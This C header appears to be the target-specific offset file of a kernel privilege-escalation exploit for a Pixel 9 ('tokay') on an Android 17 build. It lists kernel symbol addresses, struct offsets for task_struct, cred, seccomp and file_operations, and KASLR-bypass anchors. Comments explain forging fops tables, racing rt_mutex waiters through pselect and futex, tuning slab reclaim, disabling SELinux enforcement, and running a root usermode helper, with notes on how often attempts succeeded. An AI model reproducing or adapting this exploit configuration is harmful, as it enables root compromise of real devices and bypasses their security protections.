// tokay — Pixel 9, Android 17
// Build: CP2A.260705.006
// Kernel: 6.1.157-android14-11-gbd23337e42e7-ab14791245  (KMI android14-6.1)
// Codename, build ID, fingerprint and kernel release above are confirmed
// against a physical Pixel 9a on this build.
//
// PROVENANCE
// ==========
// Two independent sources, both carved out of
// .factory-images/tokay-cp2a.260705.006/Image — no value below is inherited
// from another target and none is guessed:
//
//  1. Symbol addresses — kallsyms, recovered with vmlinux-to-elf (102271
//     symbols). Every symbol referenced here was resolved by name; nothing
//     was pattern-matched or approximated.
//
//  2. Struct member offsets — the kernel's own BTF blob, which is linked
//     into this image (CONFIG_DEBUG_INFO_BTF=y) and sits at file offset
//     0x01661000 (5653158 bytes, magic 0xeb9f). BTF is emitted by pahole
//     from the built vmlinux's DWARF, so it describes *this* build's real
//     layout — it is authoritative in a way kernel source is not, and it
//     already accounts for any layout randomization. (Moot here anyway:
//     CONFIG_RANDSTRUCT is not set in this build's embedded IKCONFIG.)
//
// tegu is the only android14-6.1 target in this repo; blazer/mustang/rango
// are all android15-6.6. Their struct offsets are NOT valid here and the
// differences are not subtle — see the DIVERGENCE notes below. Anything
// tagged "arch constant" is the one category that is neither a symbol nor a
// struct member, and is called out individually.
//
// STATUS: complete, self-consistent, and never run on hardware. Every value
// is sourced, but "sourced" is not "tested" — an exploit that gets a live
// kernel write wrong does not fail cleanly.

#ifndef OFFSET_H
#define OFFSET_H

#if defined(APP_PAYLOAD) && APP_PAYLOAD
#define BUILD_VARIANT_LABEL "tokay-CP2A.260705.006-app"
#else
#define BUILD_VARIANT_LABEL "tokay-CP2A.260705.006-root-umh"
#endif
#ifndef BUILD_FINGERPRINT
#define BUILD_FINGERPRINT "google/tokay/tokay:17/CP2A.260705.006/15641320:user/release-keys"
#endif

// ── Base / memory layout ────────────────────────────────────────────────
// DIVERGENCE from blazer (0xffffffc080000000). This is not a guess and not
// the vmlinux-to-elf "first symbol" fallback that happens to agree with it:
// on arm64, KIMAGE_VADDR == MODULES_END == _PAGE_END(VA_BITS_MIN) +
// MODULES_VSIZE. This build has CONFIG_ARM64_VA_BITS=39, so _PAGE_END is
// 0xffffffc000000000, and the 6.1 module region is 128MB — giving
// 0xffffffc008000000. blazer's 6.6 kernel uses the 2GB module region
// introduced later, hence its +0x80000000. Both fall out of the same
// formula; the kernel line is what differs.
#define KIMAGE_TEXT_BASE 0xffffffc008000000ULL
#define P0_PAGE_OFFSET 0xffffff8000000000ULL
#define P0_PHYS_OFFSET 0x80000000ULL
#define P0_KERNEL_PHYS_LOAD 0x80000000ULL
#define KERNELSNITCH_IDENTITY_START 0xffffff8000000000ULL
#define KERNELSNITCH_IDENTITY_END 0xffffff9000000000ULL
#define DIRECT_MAP_BASE 0xffffff8000000000ULL
#define DIRECT_MAP_END 0xffffff9000000000ULL
#define VMEMMAP_START 0xfffffffe00000000ULL

// ── Kernel symbol offsets (kallsyms, resolved by name) ──────────────────
#define ASHMEM_IOCTL_OFF            0x00c38d28ULL
#define ASHMEM_MMAP_OFF             0x00c396b8ULL
#define ASHMEM_OPEN_OFF             0x00c398d8ULL
#define ASHMEM_RELEASE_OFF          0x00c39960ULL
#define ASHMEM_SHOW_FDINFO_OFF      0x00c39a80ULL
#define ASHMEM_FOPS_OFF             0x01280b50ULL

// &ashmem_miscs[0].fops = ashmem_miscs + offsetof(struct miscdevice, fops)
// = 0x10. Same value as lynx, which is correct because lynx runs the byte
// identical kernel (6.1.157-android14-11-gbd23337e42e7-ab14791245) — 93 of
// the 94 symbol offsets in these two headers already agreed, and this was the
// only one that did not.
//
// It used to resolve to the global misc_fops in drivers/char/misc.c, on the
// reasoning that a freshly opened misc fd starts there. It does, but only for
// an instant, and that is the wrong slot to own: misc_open() looks the driver
// up by minor and then does
//     new_fops = fops_get(c->fops);   /* c is the miscdevice */
//     replace_fops(file, new_fops);
// so what decides the new fd's f_op is the miscdevice's own ->fops field, not
// the shared misc_fops it transiently had. Overwriting misc_fops is undone by
// replace_fops() before the fd is ever usable, and misc_fops is const .rodata
// besides, which is why the old value sat below ASHMEM_FOPS_OFF while this one
// sits above it in .data.
//
// This is what stopped tokay at try_cfi_stage() step 4 on every attempt of both
// main routes: the overwrite went somewhere harmless, so the read-back never
// matched fake_fops, and nothing ever crashed to say so.
#define ASHMEM_MISC_FOPS_OFF        0x0217cb80ULL

// NAMING: kallsyms spells this `compat_ashmem_ioctl`, not
// `ashmem_compat_ioctl`. Cross-checked against the live ashmem_fops struct
// in the image: its compat_ioctl slot (FOPS_COMPAT_IOCTL_OFF, 0x58) holds
// exactly this address.
#define ASHMEM_COMPAT_IOCTL_OFF     0x00c39660ULL

#define CONFIGFS_READ_ITER_OFF      0x00464400ULL
#define CONFIGFS_BIN_WRITE_ITER_OFF 0x00464930ULL
#define NOOP_LLSEEK_OFF             0x003986dcULL
#define INIT_TASK_OFF               0x0201f640ULL
#define ROOT_TASK_GROUP_OFF         0x02208580ULL
#define SELINUX_BLOB_SIZES_OFF      0x015ceb88ULL
#define SECURITY_HOOK_HEADS_OFF     0x015ce478ULL
#define KMALLOC_CACHES_OFF          0x015cdfb8ULL
#define ANON_PIPE_BUF_OPS_OFF       0x01109910ULL
#define CALL_USERMODEHELPER_EXEC_WORK_OFF 0x000d36f4ULL
#define SYSTEM_UNBOUND_WQ_OFF       0x0200ae60ULL

// DIVERGENCE: `copy_splice_read` does not exist on 6.1 — it is the 6.6-era
// rename/rework of the generic "splice by driving ->read_iter" helper. Its
// 6.1 counterpart is `generic_file_splice_read`, which has the identical
// file_operations::splice_read prototype
// (struct file *, loff_t *, struct pipe_inode_info *, size_t, unsigned int)
// and likewise funnels through call_read_iter — i.e. into the
// configfs_read_iter we plant at FOPS_READ_ITER_OFF. The payload only ever
// *writes* this pointer into the forged fops table (util.c
// put_fake_fops_table, fops.c refresh table); it never splices through it,
// so it has to be a correctly-typed, plausible function pointer rather than
// a behaviourally identical one.
#define COPY_SPLICE_READ_OFF        0x003e5fd4ULL /* generic_file_splice_read */

// DIVERGENCE: 6.1 has no bare `selinux_enforcing` global — SELinux state
// lives in `struct selinux_state selinux_state`, and .enforcing is its first
// member (byte offset 0x0, per BTF), so the address is the struct's own.
// Verified not randomized: CONFIG_RANDSTRUCT is unset in the embedded
// IKCONFIG, and BTF reflects post-randomization layout regardless.
#define SELINUX_ENFORCING_OFF       0x0225a420ULL /* selinux_state + 0x0 */

#define ASHMEM_MISC_FOPS (KIMAGE_TEXT_BASE + ASHMEM_MISC_FOPS_OFF)
#define ASHMEM_FOPS (KIMAGE_TEXT_BASE + ASHMEM_FOPS_OFF)
#define ASHMEM_IOCTL (KIMAGE_TEXT_BASE + ASHMEM_IOCTL_OFF)
#define ASHMEM_COMPAT_IOCTL (KIMAGE_TEXT_BASE + ASHMEM_COMPAT_IOCTL_OFF)
#define ASHMEM_MMAP (KIMAGE_TEXT_BASE + ASHMEM_MMAP_OFF)
#define ASHMEM_OPEN (KIMAGE_TEXT_BASE + ASHMEM_OPEN_OFF)
#define ASHMEM_RELEASE (KIMAGE_TEXT_BASE + ASHMEM_RELEASE_OFF)
#define ASHMEM_SHOW_FDINFO (KIMAGE_TEXT_BASE + ASHMEM_SHOW_FDINFO_OFF)
#define CONFIGFS_READ_ITER (KIMAGE_TEXT_BASE + CONFIGFS_READ_ITER_OFF)
#define CONFIGFS_BIN_WRITE_ITER (KIMAGE_TEXT_BASE + CONFIGFS_BIN_WRITE_ITER_OFF)
#define COPY_SPLICE_READ (KIMAGE_TEXT_BASE + COPY_SPLICE_READ_OFF)
#define NOOP_LLSEEK (KIMAGE_TEXT_BASE + NOOP_LLSEEK_OFF)
#define INIT_TASK (KIMAGE_TEXT_BASE + INIT_TASK_OFF)
#define ROOT_TASK_GROUP (KIMAGE_TEXT_BASE + ROOT_TASK_GROUP_OFF)
#define SELINUX_BLOB_SIZES (KIMAGE_TEXT_BASE + SELINUX_BLOB_SIZES_OFF)
#define SELINUX_ENFORCING (KIMAGE_TEXT_BASE + SELINUX_ENFORCING_OFF)
#define SECURITY_HOOK_HEADS (KIMAGE_TEXT_BASE + SECURITY_HOOK_HEADS_OFF)
#define KMALLOC_CACHES (KIMAGE_TEXT_BASE + KMALLOC_CACHES_OFF)
#define ANON_PIPE_BUF_OPS (KIMAGE_TEXT_BASE + ANON_PIPE_BUF_OPS_OFF)
#define CALL_USERMODEHELPER_EXEC_WORK (KIMAGE_TEXT_BASE + CALL_USERMODEHELPER_EXEC_WORK_OFF)
#define SYSTEM_UNBOUND_WQ (KIMAGE_TEXT_BASE + SYSTEM_UNBOUND_WQ_OFF)

// ── Slide references (KASLR bypass anchors) ─────────────────────────────
#define SLIDE_NFULNL_LOGGER_OFF     0x020129d0ULL

// &loggers[0][1], not the `loggers` symbol itself. loggers is
//   struct nf_logger *loggers[NFPROTO_NUMPROTO][NF_LOG_TYPE_MAX]
// so [0][1] is one pointer in: the NFPROTO_UNSPEC / NF_LOG_TYPE_ULOG slot,
// which nfnetlink_log fills with &nfulnl_logger at registration. (The image
// confirms the type: nfulnl_logger.type reads 1 = NF_LOG_TYPE_ULOG.) Slot
// [0][0] is the LOG-type entry, which nothing registers and which stays zero —
// pointing the leak there makes boot_id read 16 zero bytes, which is exactly
// what a run reported before this was corrected.
//
// Cross-checked against blazer: taking its 0x021221b0 as loggers+8 puts its
// loggers at 0x021221a8, giving nfulnl_logger - loggers = 0xb8 — the same
// 0xb8 measured here. Two different kernel lines agreeing on that distance
// confirms both the array layout and that blazer's value is also loggers+8.
#define SLIDE_LOGGERS_0_1_OFF       0x02012920ULL /* loggers(0x02012918) + 8 */

// Despite the name this is not about boot_id randomness. slide.c plants it
// as the rb_left pointer of the forged waiter's rbtree nodes, so the tree
// rotation clobbers whatever sits there; fops.c restore_slide_boot_id() then
// puts the original value back. That tells us exactly what it must be: a
// kernel data slot whose correct content is &sysctl_bootid. That is the
// .data field of the `boot_id` entry in random_table[], located by walking
// random_table (0x02137c00) in 0x40-byte struct ctl_table strides to the
// entry whose procname is "boot_id" (index 4) and confirming its .data
// already equals sysctl_bootid (SLIDE_SYSCTL_BOOTID, below).
#define SLIDE_RANDOM_BOOT_ID_DATA_OFF 0x02137d08ULL /* &random_table[4].data */

#define SLIDE_INIT_TASK_OFF         INIT_TASK_OFF
#define SLIDE_ROOT_TASK_GROUP_OFF   ROOT_TASK_GROUP_OFF
#define SLIDE_SYSCTL_BOOTID_OFF     0x0227b498ULL

// DIVERGENCE: overrides slide.c's 0, which is the 6.6 value. This is not a
// symbol or a struct offset — it is where futex_wait_requeue_pi's on-stack
// rt_mutex_waiter lands relative to core_sys_select's stack_fds array, both
// measured from the same syscall-entry sp, so it falls out of this kernel's
// compiled stack frames. Read off the prologues of this image:
//
//   __arm64_sys_pselect6    sub sp, sp, #0x90
//   core_sys_select         sub sp, sp, #0x1c0 ; add x23, sp, #0x50  <- bits
//     => fd_sets   = sp_entry - 0x90 - 0x1c0 + 0x50  = sp_entry - 0x200
//
//   __arm64_sys_futex       sub sp, sp, #0x70
//   do_futex                sub sp, sp, #0x60
//   futex_wait_requeue_pi   sub sp, sp, #0x1b0 ; add x2, sp, #0x98   <- rt_waiter
//     (confirmed twice: same sp+0x98 is passed to rt_mutex_wait_proxy_lock
//      as its waiter argument and to rt_mutex_cleanup_proxy_lock)
//     => rt_waiter = sp_entry - 0x70 - 0x60 - 0x1b0 + 0x98 = sp_entry - 0x1e8
//
//   shift = (0x200 - 0x1e8) / 8 = 3 words
//
// All five frames are fixed-size with a single prologue adjustment, so there
// is no dynamic stack sizing to account for. With the waiter being 0x58 bytes
// (11 words), words 3..13 are used, which still lands inside in/out/ex
// (words 0..14) and never reaches the res_* half that core_sys_select memsets.
#define SLIDE_PSELECT_WORD_SHIFT 3


// The reclaim knobs are deliberately left at common.h's defaults
// (RECLAIM_KEEP_PCP_SHAPING 0, RECLAIM_SPRAY_AFTER_LEAK_FREE 0,
// SKB_RECLAIM_SENDS 4). Raising them was tried on this device and measured
// against the defaults in a single boot, off a single KASLR base, with one
// binary and only those three values changed: 1/1/12 gave 40 fresh pages, 40
// short reads at step 4 and no landings, while 0/0/4 took root on the first
// page. End to end the defaults also let the slide win on its first attempt
// where 1/1/12 had needed five, so they cost that route attempts as well.

// Left at common.h's 5. Raising it to 12 was meant to lift n->nr_partial past
// s->min_partial so __unfreeze_partials() would discard the emptied target
// slab to the page allocator instead of parking it on the node partial list.
// It did not help and looks like it hurt: the slide route landed 2 of 5 runs
// at 5 and 1 of 8 at 12. The likely reason is that MM_PARTIALS also sizes the
// spray, so 12 takes the spray from 192 children to 416, and every one of them
// is another mm_struct allocation and free competing for the page the reclaim
// is trying to win. The threshold argument still stands on its own; it just
// cannot be bought this way. The sample is small, so this is a revert to the
// configuration with the better observed rate, not a settled result.

// Worth recording for whoever debugs a reclaim miss here: CONFIG_SLUB_CPU_PARTIAL
// is set on this build, and on a miss the emptied target slab is handed back
// out as an mm_struct rather than reaching the page allocator. It shows up as
// fake_lock + 0x10 reading mm_struct.data_vm (BTF offset 0xe0) — observed as
// 0x91b on two boots and 0x91a on a third. It is a real effect; it just is not
// what decides whether this target works.


#define SLIDE_NFULNL_LOGGER_IMAGE (KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_OFF)
#define SLIDE_LOGGERS_0_1_IMAGE (KIMAGE_TEXT_BASE + SLIDE_LOGGERS_0_1_OFF)
#define SLIDE_RANDOM_BOOT_ID_DATA_IMAGE (KIMAGE_TEXT_BASE + SLIDE_RANDOM_BOOT_ID_DATA_OFF)
#define SLIDE_INIT_TASK_IMAGE (KIMAGE_TEXT_BASE + SLIDE_INIT_TASK_OFF)
#define SLIDE_ROOT_TASK_GROUP_IMAGE (KIMAGE_TEXT_BASE + SLIDE_ROOT_TASK_GROUP_OFF)
#define SLIDE_SYSCTL_BOOTID_IMAGE (KIMAGE_TEXT_BASE + SLIDE_SYSCTL_BOOTID_OFF)

// ── Page layout (payload-internal constants, not build-specific) ────────
#define LOCK_OFF        0x1350
#define W0_OFF          0x2220
#define FOPS_OFF        0x1000
#define SCRATCH_OFF     0x3000
#define RIGHT_OFF       0x4440
#define LEFT_OFF        0x5550
#define FAKE_TASK_OFF   0x3200

// ── struct file_operations (BTF, size 0x110) ────────────────────────────
// DIVERGENCE: every pointer from unlocked_ioctl onward sits 0x08 higher than
// on blazer. 6.6 dropped ->sendpage from file_operations; 6.1 still has it,
// which shifts the tail. SPLICE_READ in particular is 0xc8 here — 0xc0 is
// ->splice_write, and writing our read helper there would be silently wrong.
#define FOPS_OWNER_OFF          0x00
#define FOPS_LLSEEK_OFF         0x08
#define FOPS_READ_OFF           0x10
#define FOPS_WRITE_OFF          0x18
#define FOPS_READ_ITER_OFF      0x20
#define FOPS_WRITE_ITER_OFF     0x28
#define FOPS_IOCTL_OFF          0x50
#define FOPS_COMPAT_IOCTL_OFF   0x58
#define FOPS_MMAP_OFF           0x60
#define FOPS_OPEN_OFF           0x70
#define FOPS_RELEASE_OFF        0x80
#define FOPS_SPLICE_READ_OFF    0xc8
#define FOPS_SHOW_FDINFO_OFF    0xe0

// ── struct rt_mutex_waiter (BTF, size 0x58) ─────────────────────────────
// DIVERGENCE, and the one place where 6.1 is not merely shifted but shaped
// differently. 6.6 wraps each rbtree node in `struct rt_waiter_node`
// { rb_node entry; int prio; u64 deadline; }, so tree and pi_tree each carry
// their own prio/deadline. 6.1 has a flat struct with a single prio and a
// single deadline shared by both nodes. The TREE_/PI_TREE_ prio and deadline
// macros therefore deliberately alias onto the same bytes here. That is
// sound rather than a fudge: util.c and slide.c write FAKE_WAITER_PRIO to
// both prio macros and 0 to both deadline macros, so the aliased writes are
// idempotent. Field order also differs — task/lock/wake_state precede
// prio/deadline on 6.1 and follow them on 6.6.
#define FAKE_WAITER_PI_TREE_ENTRY_OFF   0x18
#define FAKE_WAITER_TASK_OFF            0x30
#define FAKE_WAITER_LOCK_OFF            0x38
#define FAKE_WAITER_WAKE_STATE_OFF      0x40
#define FAKE_WAITER_TREE_PRIO_OFF       0x44 /* aliases pi_tree prio */
#define FAKE_WAITER_PI_TREE_PRIO_OFF    0x44 /* aliases tree prio */
#define FAKE_WAITER_TREE_DEADLINE_OFF   0x48 /* aliases pi_tree deadline */
#define FAKE_WAITER_PI_TREE_DEADLINE_OFF 0x48 /* aliases tree deadline */
#define FAKE_WAITER_WW_CTX_OFF          0x50

// ── struct task_struct (BTF, size 0x12c0) ───────────────────────────────
// DIVERGENCE: everything from ->tasks onward has moved relative to blazer
// (pid 0x618→0x630, cred 0x820→0x838, comm 0x830→0x848, seccomp
// 0x8e8→0x900, the whole pi_* block 0x90c→0x924). The head of the struct
// (usage/prio/normal_prio/sched_task_group) happens to be unchanged.
#define FAKE_TASK_USAGE_OFF         0x40
#define FAKE_TASK_PRIO_OFF          0x84
#define FAKE_TASK_NORMAL_PRIO_OFF   0x8c
#define FAKE_TASK_TASK_GROUP_OFF    0x348 /* ->sched_task_group */
#define FAKE_TASK_PI_LOCK_OFF       0x924
#define FAKE_TASK_PI_WAITERS_OFF    0x938
#define FAKE_TASK_PI_TOP_TASK_OFF   0x948
#define FAKE_TASK_PI_BLOCKED_ON_OFF 0x950

#define TASK_PID_OFF                  0x630
#define TASK_TGID_OFF                 0x634
#define TASK_REAL_PARENT_OFF          0x640
#define TASK_REAL_CRED_OFF            0x830
#define TASK_CRED_OFF                 0x838
#define TASK_COMM_OFF                 0x848
#define TASK_TASKS_OFF                0x550
#define TASK_SECCOMP_OFF              0x900
#define TASK_ATOMIC_FLAGS_OFF         0x5f0
// task_struct embeds struct thread_info at 0x0 and ->flags is its first
// member, so this stays 0x00 (BTF-confirmed, not assumed).
#define TASK_THREAD_INFO_FLAGS_OFF    0x00

// ── struct cred (BTF, size 0xb0) ────────────────────────────────────────
// DIVERGENCE: uniformly 4 bytes lower than blazer, because 6.6 widened
// cred->usage from atomic_t to atomic_long_t. CRED_CAPS_OFF points at
// cap_inheritable; the five kernel_cap_t sets are contiguous 8-byte entries
// in the order root.c's CRED_CAP_* indices expect
// (inheritable, permitted, effective, bset, ambient → 0x28..0x50).
#define CRED_UID_OFF                  4
#define CRED_SECUREBITS_OFF           36
#define CRED_CAPS_OFF                 40
#define CRED_SECURITY_OFF             120
// Default only — root.c overwrites selinux_cred_blob_off at runtime from
// SELINUX_BLOB_SIZES.lbs_cred before it is used.
#define SELINUX_CRED_BLOB_OFF         0
// struct task_security_struct (BTF, size 0x18)
#define SELINUX_CRED_OSID_OFF         0
#define SELINUX_CRED_SID_OFF          4

// ── struct seccomp (BTF, size 0x10) — unchanged from blazer ─────────────
#define SECCOMP_MODE_OFF              0x00
#define SECCOMP_FILTER_COUNT_OFF      0x04
#define SECCOMP_FILTER_OFF            0x08
// arch constants, not struct members and not in BTF: TIF_SECCOMP is bit 11
// in arch/arm64/include/asm/thread_info.h and PFA_NO_NEW_PRIVS is the first
// PFA_* in include/linux/sched.h. Both are unchanged between 6.1 and 6.6.
#define TIF_SECCOMP_BIT               11
#define PFA_NO_NEW_PRIVS_BIT          0

// DIVERGENCE: mm_struct->owner, 0x408 on blazer.
#define MM_OWNER_OFF                  824

// DIVERGENCE: overrides common.h's 0x500, which is the 6.6 value. This is the
// SLUB object size of the mm_struct cache, and KernelSnitch strides the slab by
// it — a wrong value means the scan never lands on a live mm_struct and the
// leak fails on every retry.
//
// sizeof(struct mm_struct) is 960 in this build's BTF, but that is NOT the
// object size. proc_caches_init() sizes the cache as
//     mm_size = sizeof(struct mm_struct) + cpumask_size();
// because mm_struct ends with the cpu_bitmap[] flexible array, which BTF
// reports as zero-length. CONFIG_NR_CPUS=32 and CONFIG_CPUMASK_OFFSTACK is
// unset, so cpumask_size() is BITS_TO_LONGS(32) * 8 = 8:
//     960 + 8 = 968, then SLAB_HWCACHE_ALIGN rounds up to the 64-byte
//     cache line => 1024.
// Confirmed against the device, where /proc/slabinfo is world-readable:
//     mm_struct  999  1276  1024  32  8
// i.e. objsize 1024, 32 objects per slab, 8 pages per slab. The 8 pages also
// re-confirm MM_ORDER 3, so that still needs no override.
#define MM_STRUCT_SZ                  0x400

// DIVERGENCE: overrides common.h's 2 / 4, which are the 6.6 values. From this
// build's BTF, enum kmalloc_cache_type is
//   KMALLOC_NORMAL=0  KMALLOC_DMA=0  KMALLOC_CGROUP=1  KMALLOC_RECLAIM=2
//   NR_KMALLOC_TYPES=3
// KMALLOC_DMA collapses onto KMALLOC_NORMAL because CONFIG_ZONE_DMA is not set
// in this build (only CONFIG_ZONE_DMA32), which pulls CGROUP down to row 1.
// pipe_buffer arrays are allocated with GFP_KERNEL_ACCOUNT and so live in the
// CGROUP row; reading row 2 here would hand back the RECLAIM kmalloc-2048
// cache instead, and pipe_cache_matches() would never match. The row count
// matters too: KMALLOC_CACHE_SLOTS sizes the bulk read of kmalloc_caches, and
// 4 rows would read 112 bytes past the end of a 3-row array.
// Both values still hold even though this device boots with
// cgroup.memory=nokmem (see /proc/cmdline), which is why /proc/slabinfo lists
// only kmalloc-* and kmalloc-rcl-* and no kmalloc-cg-* at all. nokmem makes
// new_kmalloc_cache() alias the CGROUP row onto NORMAL rather than remove it,
// so the enum — and therefore the row count — is unchanged, row 1 is a valid
// cache pointer, and GFP_KERNEL_ACCOUNT pipe_buffer arrays land in that same
// cache. Do not "fix" this to 0 on the strength of the missing cg caches.
#define KMALLOC_CGROUP_TYPE           1
#define KMALLOC_CACHE_TYPES           3
#define PIPE_BUFFER_SIZE              0x28
// pipe_buffer arrays are PIPE_BUFFER_SLOTS * PIPE_BUFFER_SIZE = 32 * 0x28 =
// 1280 bytes, so they come out of kmalloc-2k: index 11. Same as lynx.
#define KMALLOC_PIPE_INDEX            11

// ── main route transport (src/61) ───────────────────────────────────────
// Use the TCP route, not pselect. The pselect main route was run to
// exhaustion on this device: all 26 attempts reported calls=1 success=1, so
// the race fired every time, and every one of them failed try_cfi_stage() at
// step 4 with the ashmem f_op never overwritten. A panic captured mid-race
// died in rt_mutex_top_waiter() reading lock->waiters.rb_leftmost — which is
// the rb_leftmost misalignment src/61/common.h already documents for pselect
// on 6.1, and the reason it tells 6.1 targets to override this to 1.
#define MAIN_TCP_ROUTE_DEFAULT        1
#define MAIN_TCP_PAYLOAD_DEFAULT      1

// Distinct from slide61.c's own SLIDE_PSELECT_WORD_SHIFT (3, which this
// device confirmed empirically): this one places the fd_set word map for the
// pselect *main* route. lynx runs the identical kernel build
// (6.1.157-android14-11-gbd23337e42e7-ab14791245), so the compiled stack
// frames — and therefore this shift — are the same.
#define PSELECT_WAITER_WORD_SHIFT     1

// ── struct page / struct slab (BTF) ─────────────────────────────────────
// DIVERGENCE: STRUCT_SLAB_CACHE_OFF is 0x08 on blazer. 6.6 hoisted
// ->slab_cache to sit directly after __page_flags; on 6.1 the slab_list /
// rcu_head union still comes first, putting slab_cache at 0x18. struct page
// itself is unchanged (compound_head 0x08, page_type 0x30, size 0x40).
#define STRUCT_PAGE_SIZE              0x40
#define STRUCT_PAGE_COMPOUND_HEAD_OFF 0x08
#define STRUCT_SLAB_CACHE_OFF         0x18
#define STRUCT_PAGE_TYPE_OFF          0x30

#define PIPE_BUFFER_SLOTS             32
#define PIPE_BUF_FLAG_CAN_MERGE       0x10

// ── struct workqueue_struct / pool_workqueue / worker_pool / work_struct ─
// BTF-confirmed; all identical to blazer.
#define WQ_DFL_PWQ_OFF    0xb0
#define PWQ_POOL_OFF       0x00
#define PWQ_WQ_OFF         0x08
#define PWQ_WORK_COLOR_OFF 0x10
#define PWQ_REFCNT_OFF     0x18
#define PWQ_NR_IN_FLIGHT_OFF 0x1c
#define PWQ_NR_ACTIVE_OFF  0x5c
#define PWQ_MAX_ACTIVE_OFF 0x60
#define POOL_WORKLIST_OFF  0x28
#define POOL_NR_IDLE_OFF   0x3c

#define WORK_DATA_OFF  0x00
#define WORK_ENTRY_OFF 0x08
#define WORK_FUNC_OFF  0x18

// ── struct configfs_buffer (BTF, size 0x80) — identical to blazer ───────
#define CFG_PAGE_OFF             16
#define CFG_NEEDS_READ_FILL_OFF  80
#define CFG_BIN_BUFFER_OFF       88
#define CFG_BIN_BUFFER_SIZE_OFF  96
#define CFG_CB_MAX_SIZE_OFF      100

// ── su_daemon UMH ───────────────────────────────────────────────────────
#define ROOT_UMH_PATH "/data/local/tmp/cve-2026-43499-root"
#define ROOT_UMH_WORK_OFF 0x6000
#define ROOT_UMH_DATA_OFF 0x6200

#endif
